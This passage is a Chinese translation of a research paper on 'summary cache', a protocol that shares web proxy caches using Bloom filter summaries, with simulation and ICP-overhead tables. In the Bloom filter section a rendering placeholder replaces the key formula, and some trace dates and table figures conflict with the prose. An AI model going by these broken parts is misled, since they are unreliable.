在没有代理间缓存命中（也称为远程缓存命中）的情况下，开销可以使平均用户延迟增加多达11%。</p><p>然后，我们提出了一种称为摘要缓存的新缓存共享协议。在此协议下，每个代理都保留每个其他代理的缓存目录的简明摘要。当发生高速缓存未命中时，代理首先探测所有的摘要信息，以查看该请求是否可能是其他代理中的高速缓存命中，然后仅将查询消息发送给其摘要显示出有希望的结果的那些代理。摘要信息不一定总是准确的。如果摘要中显示的请求并没有缓存命中（错误命中），则结果就是浪费了查询消息。如果摘要中另有说明（虚假未命中）时请求是缓存命中，则结果就是较高的未命中率。</p><p>我们研究了协议设计中的两个关键问题：摘要更新的频率和摘要的表现方式。使用跟踪驱动的模拟，我们显示摘要的更新可以延迟到新的固定百分比（例如<code>1％</code>）的缓存文档，并且命中率将成比例降低（对于<code>1％</code>的选择，降级为介于<code>0.02％</code>至<code>1.7％</code>之间，具体取决于轨迹）。</p><p>为了减少内存需求，我们将每个摘要存储为”布隆过滤器”。这是一种计算效率非常高的基于哈希的概率方案，它可以表示一组具有最低内存要求的键（在我们的情况下为高速缓存目录），同时成员查询的假阴性概率为0，误报率很低。跟踪驱动的模拟表明，对于典型的代理配置，对于仅在N个字节内表示的N个缓存文档，误报的百分比为<code>1％</code>至<code>2％</code>。实际上，可以通过增加误报率为代价而进一步减少存储器。（我们稍后将更详细地描述Bloom过滤器。）</p><p>基于这些结果，我们设计了摘要缓存增强的ICP协议，并在Squid代理中实现了原型。通过使用跟踪驱动的仿真以及基准测试和跟踪重放的实验，我们证明了新协议将<strong>代理间消息的数量减少了25到60倍以上，网络带宽的消耗（以传输的字节数表示） ）降低了50％以上，并减少了30％到95％的协议在CPU上开销</strong>。与没有缓存共享的情况相比，我们的实验表明，该协议只产生很少的网络流量，并且<strong>仅将CPU时间增加5％到12％</strong>，具体取决于远程缓存命中率。但是，该协议在大多数情况下都达到了类似于ICP协议的缓存命中率。</p><p>结果表明，摘要缓存增强型ICP协议可以扩展到大量代理。因此，它有可能显著增加Web缓存共享的部署并减少Internet上的Web流量。为此，我们正在将我们的实施公开发布[ 15 ]，并且正在将其转移到ICP用户社区。</p><h2 id="轨迹和模拟"><a href="#轨迹和模拟" class="headerlink" title="轨迹和模拟"></a>轨迹和模拟</h2><p><strong>表1</strong>：有关跟踪的统计信息。 命中率和字节命中率是在无限缓存下实现的。</p><table><thead><tr><th align="center">Traces</th><th align="center">DEC</th><th align="center">UCB</th><th align="center">UPisa</th><th align="center">Questnet</th><th align="center">NLANR</th></tr></thead><tbody><tr><td align="center">Time(时间)</td><td align="center">8&#x2F;29-9&#x2F;4, 1996</td><td align="center">9&#x2F;14-9&#x2F;19, 1996</td><td align="center">Jan-March, 1997</td><td align="center">1&#x2F;15-1&#x2F;21, 1998</td><td align="center">12&#x2F;22, 1997</td></tr><tr><td align="center">Requests(请求数)</td><td align="center">3543968</td><td align="center">1907762</td><td align="center">2833624</td><td align="center">2885285</td><td align="center">1766409</td></tr><tr><td align="center">Infinite Cache Size(无限缓存大小)</td><td align="center">2.88e+10</td><td align="center">1.80e+10</td><td align="center">2.07e+10</td><td align="center">2.33e+10</td><td align="center">1.37e+10</td></tr><tr><td align="center">Maximum Hit Ratio(最大命中率)</td><td align="center">0.49</td><td align="center">0.30</td><td align="center">0.40</td><td align="center">0.30</td><td align="center">0.36</td></tr><tr><td align="center">Maximum ByteHit Ratio(最大字节命中率)</td><td align="center">0.36</td><td align="center">0.14</td><td align="center">0.27</td><td align="center">0.15</td><td align="center">0.27</td></tr><tr><td align="center">Client Population(客户人数)</td><td align="center">10089</td><td align="center">5780</td><td align="center">2203</td><td align="center">12</td><td align="center">4</td></tr><tr><td align="center">Client Groups(客户群)</td><td align="center">16</td><td align="center">8</td><td align="center">8</td><td align="center">12</td><td align="center">4</td></tr></tbody></table><p>在我们的研究中，我们收集了五组HTTP请求的痕迹。<strong>表1</strong>中列出了每个跟踪中的请求数，客户端数以及其他统计信息 。特别是，<strong>表1</strong>列出了每个跟踪的”无限’’缓存大小，即跟踪中唯一文档的总大小（以字节为单位）（即”无限’’缓存的大小，不会导致缓存的替换）。</p><ul><li><p><strong>DEC</strong>跟踪[32]：Digital Equipment Corporation Web代理服务器跟踪，为大约<code>17,000个工作站</code>提供服务。跟踪持续25天（1996年8月29日至9月21日）。我们将跟踪分为三个1周和1个半周的跟踪。由于交换空间的限制，我们的模拟器只能模拟子迹线。在本文中，我们介绍了<code>1996年8月29日</code>至<code>9月4日</code>这一周的迹线结果。其他迹线的结果非常相似。</p></li><li><p><strong>UCB</strong>跟踪[24]：从UC Berkeley向其学生，教职员工提供的家庭IP服务收集的HTTP请求的跟踪。从1996年11月1日到11月19日，总迹线为期18天，并分为四个子迹线，每四或五天一次。我们在11月14日至11月19日的跟踪中显示结果。尽管该跟踪最初记录了2,468,890个请求，但其中许多响应数据大小为0或1，因此我们决定忽略这些请求。同样，我们在UCB集合中的其他迹线上进行了仿真，结果与此处介绍的相似。</p></li><li><p><strong>UPisa</strong>跟踪[43]：意大利比萨大学计算机科学系的用户在1997年1月至3月的三个月内对HTTP请求的跟踪。在跟踪中，我们仅模拟GET请求，并且仅网址不包含查询字符串的用户，因为大多数代理不缓存查询请求。</p></li><li><p><strong>Questnet</strong>追踪[47]：1998年1月15日至1月21日，父级代理在Questnet（澳大利亚的区域网络）中看到的HTTP请求日志为7天，这些代理服务于大约12个父级代理区域网络中的子代理。我们提取父代理看到的成功GET请求。因此，跟踪只是进入十个代理的用户请求的子集。不幸的是，用户对代理的完整请求集不可用。</p></li><li><p><strong>NLANR</strong>跟踪 [40]：由NLANR（应用网络研究国家实验室）向国家高速缓存层次结构中的四个主要父代理高速缓存发送HTTP请求的一日日志（1997年12月22日）。国家缓存层次结构中大约有八个代理，但是只有四个代理（“ bo”，“ pb”，“ sd”和“ uc”）处理来自.com，.net，.edu和其他主要领域。因此，我们决定仅模拟对四个代理的请求。</p></li></ul><p>在我们的缓存共享模拟中，我们将<code>DEC</code>，<code>UCB</code>和<code>UPisa</code>中的客户端分为几组，假设每个组都有自己的代理，并模拟代理之间的缓存共享。这大致对应于以下情况：</p><p>公司的每个分支机构或大学中的每个部门都有自己的代理缓存，并且这些缓存协作。我们将DEC，UCB和UPisa迹线中的组数分别设置为<code>16</code>、<code>8</code>和<code>8</code>。如果客户端的clientID与组大小相等，则将其放入组中。尽管该模拟并不完全符合实际情况，但我们相信它确实带来了有关缓存共享协议的见识。Questnet跟踪包含从区域网络中的一组子代理到父代理的HTTP请求。我们假设这些是进入子代理的请求（因为子代理将其缓存未命中发送给父代理），并且模拟了子代理之间的缓存共享。最后，NLANR跟踪包含去往四个主要代理的实际HTTP请求，我们模拟了它们之间的缓存共享。</p><p>在所有模拟中，我们将LRU用作缓存替换算法，但要注意的是，不能缓存大于250KB的文档。该策略类似于实际代理中使用的策略。我们不会根据年龄或生存时间来模拟到期的文档。而是，我们的大多数跟踪记录都包含每个请求的文档的上次修改时间，如果用户请求命中了上次修改时间已更改的文档，我们会将其视为缓存未命中。换句话说，我们假设缓存一致性机制是完美的。在实践中，有各种协议[12]，[34]，[28]为Web缓存的一致性。</p><p>我们的大多数模拟都假设缓存大小是”无限’’缓存大小的10％。研究表明，该”无限”的缓存大小的10％通常实现关于最大缓存命中率[90％ [49]，[8]，[35] ]。我们还执行了高速缓存大小为无限高速缓存大小5％的仿真，结果非常相似。</p><h2 id="缓存共享的好处"><a href="#缓存共享的好处" class="headerlink" title="缓存共享的好处"></a>缓存共享的好处</h2><p>最近的研究 [8],[23],[14]表明，在无限的缓存容量下，Web缓存命中率似乎与缓存所服务的用户数量成对数增长。 显然，来自不同用户的请求重叠减少了冷数据的miss，这通常是高速缓存未命中的重要部分，因为首次引用文档和文档修改都会对它们造成影响。</p><p><img src="https://cdn.bugwz.com/summary-cache-figure-1.png" alt="图1：不同协作缓存方案下的缓存命中率（与字节命中率的结果相似，请注意，x轴为对数刻度）"></p><p>为了检查有限缓存大小下的缓存共享的好处，我们使用上一节中列出的跟踪信息模拟以下方案：</p><ul><li><strong>无缓存共享</strong>：代理通过不协作的方式来服务彼此的缓存未命中；</li><li><strong>简单的缓存共享</strong>：代理服务彼此的缓存未命中。代理从另一个代理中获取文档后，便会在本地缓存该文档。代理通过不协调的方式进行缓存替换。这是由ICP协议实现的共享；</li><li><strong>单副本缓存共享</strong>：代理服务彼此的缓存未命中，但是一个代理不缓存从另一个代理获取的文档。而是，另一个代理将文档标记为最近访问的文档，并增加了其缓存优先级。与<strong>简单的缓存共享</strong>相比，此方案消除了重复副本的存储并提高了可用缓存空间的利用率；</li><li><strong>全局缓存</strong>：代理共享缓存内容并协调替换，以便它们显示为一个统一的缓存，对用户而言具有全局LRU替换。这是协作缓存的完全协调形式。我们通过假设所有请求都转到一个缓存的大小来模拟该方案，该缓存的大小是所有代理缓存大小的总和；.</li></ul><p>为了回答两个问题，我们研究了这些方案：简单的缓存共享是否会显著减少Web服务器的流量，更紧密的协调方案是否会导致命中率显著提高。</p><p><strong>图1</strong> 显示了当每个跟踪的缓存大小分别设置为”无限缓存大小’’（完全避免替换所需的最小高速缓存大小）大小的 <code>0.5％</code>，<code>5％</code>，<code>10％</code> 和 <code>20％</code> 时考虑的不同方案下的命中率。字节命中率的结果非常相似，由于空间限制，我们将其省略。</p><p>通过查看 <strong>图1</strong>，我们了解到，首先所有缓存共享方案比没有缓存共享显著提高了命中率。结果充分证实了共享缓存的好处，即使使用了很小的缓存。</p><p>其次，<strong>单拷贝缓存共享</strong>和<strong>简单的缓存共享</strong>下的命中率通常与<strong>全局缓存</strong>下的命中率相同甚至更高。我们认为，原因是全局LRU有时表现不如逐组LRU。特别是，在<strong>全局缓存</strong>设置中，来自一个用户的快速连续请求突发可能会干扰许多用户的工作集。在<strong>单副本缓存共享</strong>或<strong>简单缓存共享</strong>中，每个缓存专用于特定的用户组，并且来自每个组的流量争夺单独的缓存空间。因此，缓存穿透只包含在特定组中。</p><p>第三，将<strong>单副本缓存共享</strong>与<strong>简单的缓存共享</strong>进行比较时，我们发现浪费空间仅会产生很小的影响。原因是有效缓存略小，命中率没有明显差异。为了证明这一点，我们还使用比原始缓存小 <code>10％</code> 的<strong>全局缓存</strong>运行模拟。从 <strong>图1</strong> 可以看出，差异很小。</p><p>因此，尽管它很简单，但 <code>ICP</code> 类型的<strong>简单的缓存共享</strong>却获得了更精细的协作缓存的大部分好处。** 简单的缓存共享**不会通过将内容从繁忙的缓存移动到较不繁忙的缓存来执行任何负载平衡，并且无法通过仅保留每个文档的一个副本来节省空间。 但是，如果正确地完成了每个代理的资源规划，则无需执行负载平衡并产生更紧密协调方案的开销。</p><p>最后，请注意该结果是根据第2节中所述的LRU替换算法获得的。不同的替换算法[8]可能给出不同的结果。 此外，单独的仿真已确认，在严重的负载不平衡的情况下，<strong>全局缓存</strong>将具有更好的缓存命中率，因此，重要的是分配每个代理的缓存大小，使其与用户群大小和预期使用成比例。</p><h2 id="ICP的开销"><a href="#ICP的开销" class="headerlink" title="ICP的开销"></a>ICP的开销</h2><p><strong>表2</strong>：在四个代理情况下的ICP开销。 SC-ICP协议在第6节中介绍，稍后将进行说明。 实验进行了3次，每次测量的方差在括号中列出。 开销信息的行列出了每次测量的无ICP百分比增加。 请注意，在合成实验中没有代理间缓存命中。</p><table><thead><tr><th>Exp 1</th><th>Hit Ratio</th><th>Client Latency</th><th>User CPU</th><th>System CPU</th><th>UDP Msgs</th><th>TCP Msgs</th><th>Total Packets</th></tr></thead><tbody><tr><td>no ICP</td><td>25%</td><td>2.75 (5%)</td><td>94.42 (5%)</td><td>133.65 (6%)</td><td>615 (28%)</td><td>334K (8%)</td><td>355K(7%)</td></tr><tr><td>ICP</td><td>25%</td><td>3.07 (0.7%)</td><td>116.87 (5%)</td><td>146.50 (5%)</td><td>54774 (0%)</td><td>328K (4%)</td><td>402K (3%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>12%</td><td>24%</td><td>10%</td><td>9000%</td><td>2%</td><td>13%</td></tr><tr><td>SC-ICP</td><td>25%</td><td>2.85 (1%)</td><td>95.07 (6%)</td><td>134.61 (6%)</td><td>1079 (0%)</td><td>330K (5%)</td><td>351K (5%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>4%</td><td>0.7%</td><td>0.7%</td><td>75%</td><td>-1%</td><td>-1%</td></tr><tr><td><strong>Exp 2</strong></td><td><strong>Hit Ratio</strong></td><td><strong>Client Latency</strong></td><td><strong>User CPU</strong></td><td><strong>System CPU</strong></td><td><strong>UDP Msgs</strong></td><td><strong>TCP Msgs</strong></td><td><strong>Total Packets</strong></td></tr><tr><td>no ICP</td><td>45%</td><td>2.21 (1%)</td><td>80.83 (2%)</td><td>111.10 (2%)</td><td>540 (3%)</td><td>272K (3%)</td><td>290K (3%)</td></tr><tr><td>ICP</td><td>45%</td><td>2.39 (1%)</td><td>97.36 (1%)</td><td>118.59 (1%)</td><td>39968 (0%)</td><td>257K (2%)</td><td>314K (1%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>8%</td><td>20%</td><td>7%</td><td>7300%</td><td>-1%</td><td>8%</td></tr><tr><td>SC-ICP</td><td>45%</td><td>2.25 (1%)</td><td>82.03 (3%)</td><td>111.87 (3%)</td><td>799 (5%)</td><td>269K (5%)</td><td>287K (5%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>2%</td><td>1%</td><td>1%</td><td>48%</td><td>-1%</td><td>-1%</td></tr></tbody></table><p>Internet缓存协议（ICP）[18]在鼓励世界各地的Web缓存共享实践方面非常成功。 它需要代理之间的松散协调，并且基于UDP构建以提高效率。 它是由Harvest研究小组[26]设计的，并得到了公共领域Squid [19]代理软件和当今一些商业产品的支持。 随着Squid代理在全球的部署，ICP被全球很多国家广泛使用，以减少跨大西洋和跨太平洋链接的流量。</p><p>尽管ICP取得了成功，但它并不是一个可扩展的协议。 问题在于ICP依赖查询来查找远程缓存命中。 每当一个代理遇到高速缓存未命中时，其他所有人都会收到查询消息并进行处理。 随着协作代理服务器数量的增加，开销很快就会让人望而却步。</p><p>为了衡量ICP的开销及其对代理性能的影响，我们使用了我们设计的代理基准进行了实验[1]。 （该基准已作为行业标准基准的候选者提交给SPEC，目前已在许多代理系统供应商中使用）。该基准测试由一系列客户端进程组成，这些客户端进程按照实际跟踪中观察到的模式（包含请求大小的分布和时间局限性）发出请求， 以及一组服务器的进程，这些服务器进程会延迟答复以模拟Internet中的延迟。</p><p>实验是在 <code>10</code> 个与 <code>100Mb/s</code> 以太网连接的 <code>Sun Sparc-20</code> 工作站上进行的。四个工作站充当四个代理系统，运行 <code>Squid 1.1.14</code> ，每个工作站具有75MB的缓存空间。缓存大小被人为的变小，因此在实验的短时间内就会发生缓存替换。另外四个工作站运行 <code>120</code> 个客户端进程，每个工作站上运行 <code>30</code> 个进程。每个工作站上的客户端进程都连接到代理之一。客户进程发出请求时没有思考时间，请求的文档大小遵循Pareto分布，其中  $ \alpha &#x3D; 1.1 $ 和 $k &#x3D; 3.0$  [9]。最后，两个工作站充当服务器，每个工作站监听 <code>15</code> 个不同的端口。Web服务器在处理HTTP请求时复制一个进程，该进程等待 <code>1秒钟</code>，然后发送答复以模拟网络延迟。</p><p>我们尝试使用两种不同的缓存命中率，分别为 <code>25％</code> 和 <code>45％</code>，因为ICP的开销随每个代理中的缓存未命中率而变化。在基准测试中，客户端按照[35,8]中观察到的时间局部性模式发出请求，并且可以调整请求流中的固有缓存命中率。在一个实验中，每个客户端进程发出 <code>200</code> 个请求，总共 <code>24000</code>个请求。</p><p>通过使用基准测试，我们比较了两种配置：<strong>无ICP（代理不协作）</strong> 和 <strong>ICP（代理通过ICP协作）</strong>。由于我们仅对负载开销感兴趣，因此客户端发出的请求不会重叠，并且代理之间没有远程缓存命中。对于ICP，这是最坏的情况，结果可以衡量协议的开销。我们在no-ICP和ICP实验中的随机数生成器中使用相同的种子，以确保可比较的结果，否则的话，繁重文档的大小分布和我们的低请求数会导致高方差。在不同种子环境下，无ICP和ICP之间的相对差异是相同的。 我们在这里提供一组实验的结果。</p><p>我们测量缓存中的命中率，客户端看到的平均延迟，Squid代理消耗的CPU时间（根据用户CPU时间和系统CPU时间以及网络流量）。我们使用netstat收集发送和接收的UDP数据报的数量，发送和接收的TCP数据包以及以太网接口处理的IP数据包的总数。第三个采集的信息大约是前两个采集信息的数字之和。 ICP查询和回复消息会产生UDP流量。 TCP通信包括代理与服务器之间以及代理与客户端之间的HTTP通信。 结果示于 <strong>表2</strong>。</p><p>结果表明，即使协作代理的数量低至四个，ICP也会产生可观的开销。UDP消息的数量增加了大概 <code>73</code> 到 <code>90</code>。由于UDP消息的增加，代理看到的总网络流量增加了 <code>8％</code> 至 <code>13％</code>。协议处理将用户CPU时间增加 <code>20％</code> 至 <code>24％</code> ，而UDP消息处理将系统CPU时间增加 <code>7％</code> 至 <code>10％</code> 。反映给客户端，HTTP请求的平均延迟增加了 <code>8％</code> 至  <code>11％</code> 。尽管实验是在高速局域网上进行的，但仍会发生性能下降。</p><p>结果凸显了Web缓存管理员面临的困境。 缓存共享有明显的好处，但是ICP的开销很高。此外，大多数时候，由于没有缓存文档，因此浪费了查询消息的处理时间。从本质上讲，在处理ICP上花费的精力与其他代理所经历的缓存未命中总数成正比，而不是与实际的远程缓存命中数成正比。</p><p>为了解决该问题，我们提出了一种新的可伸缩缓存共享协议：摘要缓存。</p><h2 id="摘要缓存"><a href="#摘要缓存" class="headerlink" title="摘要缓存"></a>摘要缓存</h2><p>在摘要缓存方案中，每个代理在每个其他代理中存储其缓存文档目录的摘要。当用户请求未在本地缓存中丢失时，本地代理会检查存储的摘要，以查看请求的文档是否可能存储在其他代理中。如果出现这种情况，则代理会将请求发送到相关代理以获取文档。 否则，代理将请求直接发送到Web服务器。</p><p>该方案可扩展性的关键是摘要不必是最新的或准确的。每次更改缓存目录时都不必更新摘要。 相反，更新可以按固定的时间间隔进行，也可以在摘要中未反映一定百分比的缓存文档时进行。摘要只需要包含在内（即，描述存储在缓存中的文档的超集），以避免影响总缓存命中率。 也就是说，可以容忍两种错误：</p><ul><li><p><strong>假的未命中</strong>：所请求的文档被缓存在其他代理服务器上，但是其摘要未反映该事实。 在这种情况下，不利用远程高速缓存命中，并且降低了高速缓存集合中的总命中率。</p></li><li><p><strong>假的命中</strong>：所请求的文档未在其他代理处缓存，但其摘要表明已缓存。 代理将向另一个代理发送查询消息，仅通知该文件未缓存在该代理中。 在这种情况下，浪费了查询消息。</p></li></ul><p>该错误会影响总缓存命中率或代理间流量，但不会影响缓存方案的正确性。例如，错误的命中不会导致送达错误的文档。 通常，我们会努力降低误报率，因为误报会增加Internet的流量，而缓存共享的目标是减少到Internet的流量。</p><p>摘要缓存和ICP中都会发生第三种错误，即远程过时命中。远程过时命中是指文档在另一个代理处缓存，但是缓存的副本是过时的。远程过时命中并不一定是浪费精力，因为可以使用增量压缩来传输新文档[39]。 但是，它确实有助于代理间的通信。</p><p>有两个因素限制了摘要缓存的可伸缩性：网络开销（代理间通信）和存储摘要所需的内存（出于性能原因，摘要应存储在DRAM中，而不是磁盘上）。网络开销取决于摘要更新的频率以及错误匹配和远程匹配的数量。内存需求取决于各个摘要的大小和协作代理的数量。由于内存随代理的数量线性增长，因此保持单个摘要较小很重要。下面，我们首先介绍更新频率，然后讨论各种摘要表示。</p><h3 id="更新延迟的影响"><a href="#更新延迟的影响" class="headerlink" title="更新延迟的影响"></a>更新延迟的影响</h3><p><img src="https://cdn.bugwz.com/summary-cache-figure-2.png" alt="图2：摘要更新延迟对总缓存命中率的影响（ 缓存大小是&quot;无限&#39;&#39;缓存大小的10％）"></p><p>我们调查延迟摘要的更新，直到 “新”（即未反映在摘要中）缓存文档的百分比达到阈值为止。选择阈值标准是因为错误遗漏的数量（以及总命中率的下降）往往与未反映在摘要中的文档数量成正比。另一种方法是按固定的时间间隔更新摘要。可以通过将间隔转换为阈值来得出这种方法下的误漏率。也就是说，根据请求率和典型的高速缓存未命中率，可以计算出每个时间间隔内有多少新文档进入高速缓存及其在高速缓存文档中的百分比。</p><p>使用跟踪，我们可以模拟阈值分别为已缓存文档的 <code>0.1％</code>，<code>1％</code>，<code>2％</code>，<code>5％</code> 和 <code>10％</code>时总缓存命中率。目前，我们忽略摘要表示的问题，并假设摘要是缓存目录（即文档URL列表）的副本。结果如 <strong>图2</strong> 所示。图中第一行是未引入更新延迟时的命中率。第二行显示了命中率随着更新延迟的增加。这两行之间的差异是误漏率。底部的两条曲线显示了远程过时命中的比率和错误命中的比率（延迟的确引入了一些错误命中，因为从缓存中删除的文档可能仍存在于摘要中）。</p><p>结果表明，除了NLANR的跟踪数据外，总缓存命中率的下降几乎随更新阈值线性增长。在 <code>1％</code> 的阈值下，命中率相对降低为 <code>0.2％（UCB）</code>，<code>0.1％（UPisa）</code>，<code>0.3％（Questnet）</code> 和 <code>1.7％（DEC）</code>。 远程陈旧命中率几乎不受更新延迟的影响。虚假命中率非常小，因为摘要是缓存目录的精确副本，尽管它确实随阈值线性增加。</p><p>对于 <strong>NLANR跟踪</strong>，似乎某些客户端正在同时将两个完全相同的文档请求发送到代理”bo”和NLANR集合中的另一个代理。如果仅在NLANR中模拟其他三个代理，则结果与其他跟踪的结果类似。在包含”bo’’的情况下，我们还模拟了 <code>2个用户请求</code> 和 <code>10个用户请求</code> 的延迟，命中率分别从 <code>30.7％</code> 降至 <code>26.1％</code> 和 <code>20.2％</code> 。在 <code>0.1％</code> 的阈值处的命中率大约为 <code>18.4％</code>，大约等于200个用户请求。因此，我们认为命中率的急剧下降是由于NLANR迹线中的异常引起的。不幸的是，我们无法确定有问题的客户端，因为跨NLANR跟踪的客户端ID不一致[40]。</p><p>结果表明，实际上，摘要更新延迟阈值为  <code>1％</code> 到 <code>10％</code> 时会导致高速缓存命中率的可容忍度降低。对于这五个跟踪，阈值在两次更新之间转换成大约 <code>300</code> 到 <code>3000</code> 个用户请求，平均而言，大约 <strong>每5分钟到一个小时更新一次</strong>。因此，这些更新的带宽消耗可能非常低。</p><h3 id="摘要表示"><a href="#摘要表示" class="headerlink" title="摘要表示"></a>摘要表示</h3><p>影响可伸缩性的第二个问题是摘要的大小。摘要信息需要存储在主内存中，不仅因为内存查找要快得多，而且因为磁盘臂通常是代理缓存中的瓶颈[36]。尽管DRAM价格继续下降，但由于内存需求随代理数量线性增长，因此我们仍需要仔细设计。摘要信息还会使DRAM脱离热文档的内存高速缓存，从而影响代理性能。因此，重要的是要使摘要变小。幸运的是，摘要只需包含所有内容（即，描述存储在缓存中的文档的超集），即可避免影响缓存命中率。</p><p>我们首先研究两个简单的摘要表示形式：确切目录和服务器名称。在精确目录方法中，摘要基本上是缓存目录，每个URL均由其<strong>16字节MD5签名</strong>表示[38,22]。在服务器名称方法中，摘要是缓存中URL的服务器名称部分的列表。平均来看，不同URL与不同服务器名称的比率约为 <strong>10：1</strong>（从我们的跟踪记录中可以看到），因此服务器名称方法可以将内存减少10倍。</p><p>我们使用跟踪来模拟这些方法，发现它们都不令人满意。结果在图7中，以及在另一个摘要表示中的结果（在5.2节中详细讨论了图7）。精确目录方法消耗太多内存。实际上，代理通常具有<strong>8GB</strong>至<strong>20GB</strong>的缓存空间。如果我们假设<strong>16</strong>个代理服务器每个<strong>8GB</strong>，平均文件大小为<strong>8KB</strong>，则精确目录摘要将消耗<strong>（16 -1）* 16 *（8GB &#x2F; 8KB）&#x3D;每个代理240MB主内存</strong>。服务器名称方法虽然消耗较少的内存，但会产生过多的错误命中，从而大大增加了网络消息。</p><p>理想的摘要表示形式的要求是小尺寸和低假命中率。 经过几次其他尝试，我们找到了一种称为布隆过滤器的古老技术的解决方案。</p><h3 id="布隆过滤器-数学"><a href="#布隆过滤器-数学" class="headerlink" title="布隆过滤器-数学"></a>布隆过滤器-数学</h3><p>布隆过滤器是一种可以用来在 $n$ 个元素（也被叫做Keys）的集合  $A &#x3D; &lt;!–swig￼0–&gt;)^k$</p><p>在右面的值最小的情况下，$k$ 的值为：$k&#x3D;ln2 * \displaystyle \frac{m}{n}$ ，在这种情况下：$(\displaystyle \frac{1}{2})^k &#x3D; (0.6185)^\frac{m}{n}$</p><p>由于 $k$ 必须是整数，并且实际上我们可以选择一个小于最佳值的值以减少计算开销。 一些示例值是：</p><p><strong>表3</strong> 到 <strong>表5</strong> 列出了  $\displaystyle \frac{m}{n}$ 和  $k$ 的常见组合的误报率情况。</p><p><strong>表3：</strong> 在各种 m&#x2F;n 和 $k$ 组合下的误判率。</p><table><thead><tr><th align="center">m&#x2F;n</th><th align="center">k</th><th align="center">k&#x3D;1</th><th align="center">k&#x3D;2</th><th align="center">k&#x3D;3</th><th align="center">k&#x3D;4</th><th align="center">k&#x3D;5</th><th align="center">k&#x3D;6</th><th align="center">k&#x3D;7</th><th align="center">k&#x3D;8</th></tr></thead><tbody><tr><td align="center">2</td><td align="center">1.39</td><td align="center">0.393</td><td align="center">0.400</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">2.08</td><td align="center">0.283</td><td align="center">0.237</td><td align="center">0.253</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">4</td><td align="center">2.77</td><td align="center">0.221</td><td align="center">0.155</td><td align="center">0.147</td><td align="center">0.160</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">5</td><td align="center">3.46</td><td align="center">0.181</td><td align="center">0.109</td><td align="center">0.092</td><td align="center">0.092</td><td align="center">0.101</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">6</td><td align="center">4.16</td><td align="center">0.154</td><td align="center">0.0804</td><td align="center">0.0609</td><td align="center">0.0561</td><td align="center">0.0578</td><td align="center">0.0638</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">7</td><td align="center">4.85</td><td align="center">0.133</td><td align="center">0.0618</td><td align="center">0.0423</td><td align="center">0.0359</td><td align="center">0.0347</td><td align="center">0.0364</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">8</td><td align="center">5.55</td><td align="center">0.118</td><td align="center">0.0489</td><td align="center">0.0306</td><td align="center">0.024</td><td align="center">0.0217</td><td align="center">0.0216</td><td align="center">0.0229</td><td align="center"></td></tr><tr><td align="center">9</td><td align="center">6.24</td><td align="center">0.105</td><td align="center">0.0397</td><td align="center">0.0228</td><td align="center">0.0166</td><td align="center">0.0141</td><td align="center">0.0133</td><td align="center">0.0135</td><td align="center">0.0145</td></tr><tr><td align="center">10</td><td align="center">6.93</td><td align="center">0.0952</td><td align="center">0.0329</td><td align="center">0.0174</td><td align="center">0.0118</td><td align="center">0.00943</td><td align="center">0.00844</td><td align="center">0.00819</td><td align="center">0.00846</td></tr><tr><td align="center">11</td><td align="center">7.62</td><td align="center">0.0869</td><td align="center">0.0276</td><td align="center">0.0136</td><td align="center">0.00864</td><td align="center">0.0065</td><td align="center">0.00552</td><td align="center">0.00513</td><td align="center">0.00509</td></tr><tr><td align="center">12</td><td align="center">8.32</td><td align="center">0.08</td><td align="center">0.0236</td><td align="center">0.0108</td><td align="center">0.00646</td><td align="center">0.00459</td><td align="center">0.00371</td><td align="center">0.00329</td><td align="center">0.00314</td></tr><tr><td align="center">13</td><td align="center">9.01</td><td align="center">0.074</td><td align="center">0.0203</td><td align="center">0.00875</td><td align="center">0.00492</td><td align="center">0.00332</td><td align="center">0.00255</td><td align="center">0.00217</td><td align="center">0.00199</td></tr><tr><td align="center">14</td><td align="center">9.7</td><td align="center">0.0689</td><td align="center">0.0177</td><td align="center">0.00718</td><td align="center">0.00381</td><td align="center">0.00244</td><td align="center">0.00179</td><td align="center">0.00146</td><td align="center">0.00129</td></tr><tr><td align="center">15</td><td align="center">10.4</td><td align="center">0.0645</td><td align="center">0.0156</td><td align="center">0.00596</td><td align="center">0.003</td><td align="center">0.00183</td><td align="center">0.00128</td><td align="center">0.001</td><td align="center">0.000852</td></tr><tr><td align="center">16</td><td align="center">11.1</td><td align="center">0.0606</td><td align="center">0.0138</td><td align="center">0.005</td><td align="center">0.00239</td><td align="center">0.00139</td><td align="center">0.000935</td><td align="center">0.000702</td><td align="center">0.000574</td></tr><tr><td align="center">17</td><td align="center">11.8</td><td align="center">0.0571</td><td align="center">0.0123</td><td align="center">0.00423</td><td align="center">0.00193</td><td align="center">0.00107</td><td align="center">0.000692</td><td align="center">0.000499</td><td align="center">0.000394</td></tr><tr><td align="center">18</td><td align="center">12.5</td><td align="center">0.054</td><td align="center">0.0111</td><td align="center">0.00362</td><td align="center">0.00158</td><td align="center">0.000839</td><td align="center">0.000519</td><td align="center">0.00036</td><td align="center">0.000275</td></tr><tr><td align="center">19</td><td align="center">13.2</td><td align="center">0.0513</td><td align="center">0.00998</td><td align="center">0.00312</td><td align="center">0.0013</td><td align="center">0.000663</td><td align="center">0.000394</td><td align="center">0.000264</td><td align="center">0.000194</td></tr><tr><td align="center">20</td><td align="center">13.9</td><td align="center">0.0488</td><td align="center">0.00906</td><td align="center">0.0027</td><td align="center">0.00108</td><td align="center">0.00053</td><td align="center">0.000303</td><td align="center">0.000196</td><td align="center">0.00014</td></tr><tr><td align="center">21</td><td align="center">14.6</td><td align="center">0.0465</td><td align="center">0.00825</td><td align="center">0.00236</td><td align="center">0.000905</td><td align="center">0.000427</td><td align="center">0.000236</td><td align="center">0.000147</td><td align="center">0.000101</td></tr><tr><td align="center">22</td><td align="center">15.2</td><td align="center">0.0444</td><td align="center">0.00755</td><td align="center">0.00207</td><td align="center">0.000764</td><td align="center">0.000347</td><td align="center">0.000185</td><td align="center">0.000112</td><td align="center">7.46e-05</td></tr><tr><td align="center">23</td><td align="center">15.9</td><td 